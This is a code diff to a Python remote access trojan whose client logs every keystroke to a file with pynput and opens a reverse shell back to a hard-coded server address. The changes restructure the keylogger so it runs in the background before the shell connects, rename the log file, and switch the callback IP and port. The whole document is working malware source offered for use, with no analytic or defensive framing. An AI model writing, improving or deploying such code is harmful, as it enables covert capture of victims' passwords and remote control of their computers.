@@ -14,10 +14,9 @@ class Client:
         - Gets a reverse shell back to the server
     """
 
-    def __init__(self, host: str, port: int, filename: str = "activity.log") -> None:
+    def __init__(self, host: str, port: int, filename: str = "activity.txt") -> None:
         """
         Constructor
-
         :param host: The server's IP
         :param port: The server's port number
         :param filename: The file's name where the keystrokes are stored
@@ -41,6 +40,15 @@ class Client:
         Starts logging key events
         Gets a reverse shell from client to server
         """
+        # --------------------------KEYLOGGER--------------------------#
+
+        logging.basicConfig(filename=(self.filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+        def on_press(key):
+            logging.info(str(key))
+
+        listener = Listener(on_press=on_press)
+        listener.start()
 
         # --------------------------REV SHELL--------------------------#
 
@@ -52,19 +60,7 @@ class Client:
             self.sock.close()  # Close erroneous connection
             self.hack()  # Retry
 
-        # --------------------------KEYLOGGER--------------------------#
-
-        log_dir = ""
-
-        logging.basicConfig(filename=(log_dir + self.filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-        def on_press(key):
-            logging.info(str(key))
-
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-
-        # --------------------------------------------------------------#
+        # # --------------------------------------------------------------#
 
         # Close connection when finished
         self.sock.close()
@@ -72,4 +68,4 @@ class Client:
 
 if __name__ == "__main__":
     # Run RAT with specified IP and port
-    Client("192.168.178.70", 4444).run()
+    Client("192.168.56.102", 9001).run()
